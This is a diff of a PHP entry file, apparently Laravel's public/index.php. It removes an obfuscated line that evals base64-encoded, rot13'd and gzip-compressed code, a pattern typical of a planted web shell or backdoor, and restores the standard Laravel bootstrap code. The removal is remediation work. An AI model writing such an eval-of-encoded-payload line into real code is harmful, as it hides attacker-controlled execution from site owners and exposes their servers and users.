@@ -1,2 +1,11 @@
 <?php
-eval(gzinflate(str_rot13(base64_decode('nUdaYtNAEL37SlmjqLalxK7EBSV6pEVNTURkCIVGJXi7Hser2rtzal2KgEYPiHB/AuLEAWToAak5tn8k/4TxVJqkHxdlZXPnvWz7c2mc0iAccUyZC8ksHu8odjXj1hzvW1scv1MtMRs697LqszF+KNHYoRNwIiRt7uH2a/v97m709nV7fOT2IBdcKytl9Kwu0feHjlXAWFGGEZ4LcI3XzZmQFiWTHG4LoujlwTiKAjcMgtBLpdkEw1GzHD8qfRouJQdSTbi+D5o0CI2wWTRn5tEVvjOUsdIhK63KFIt4hqHTclJOlVtRpCohK7ATpawhWIqQMluQg+fIvQ6PIQhgfR0mwoKxzJYGvsBRcAFhrm+RCIwHYacHXUjaSnX36OY7KZMTJCsexFUF05p9imVJa1YpuRVXbd3KLv+zA/SrvykNz4tZxXH4olWvOSTeKkSjLbUEq1Lu0a1bEjr8+oQWrle5FNrVTek7PQS2qL0HwB48qkUkXitnC9yiPMkED7kxIS+po2xAn64/SpiwzOCK5jXyOiLNJvooedow9cANQTIWt12nePyff3oJajMTIxeC1s+AAm4VbNIeukR6kPeoQj6MYKOagrXlyWmDMMaziEafqjl6BCBCFUjL0TLgKdMG7Unn3dFe/2ynKr+Ukj4b7c+m38Cms+mlnMDtJdWD0/Tmqk/Opr84yNsLCkh/vssUzHn6m06mJoIH8G9p/VA2VMBirneWizalvvOiF5Cq2fVf3oQXLq96hiRuSEYxbVA8f6h1nXx7bPOz4Rx5hsW93DJbCYi8nUv3ZIeXkOECGgv0NqppI1pW+wRB64VRva4eYX+Us0b0miU1GPCMGdOyaDWaT1ZGjVIL6o+oXJyh19XN5qKjaYcRlhU0HOj5fn9xqjcz55lw6Qk0y+8O3lsUqVH+Aw=='))));
+use Illuminate\Contracts\Http\Kernel;
+use Illuminate\Http\Request;
+
+define('LARAVEL_START', microtime(true));
+if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) require $maintenance;
+require __DIR__.'/../vendor/autoload.php';
+$app = require_once __DIR__.'/../bootstrap/app.php';
+$kernel = $app->make(Kernel::class);
+$response = $kernel->handle($request = Request::capture())->send();
+$kernel->terminate($request, $response);
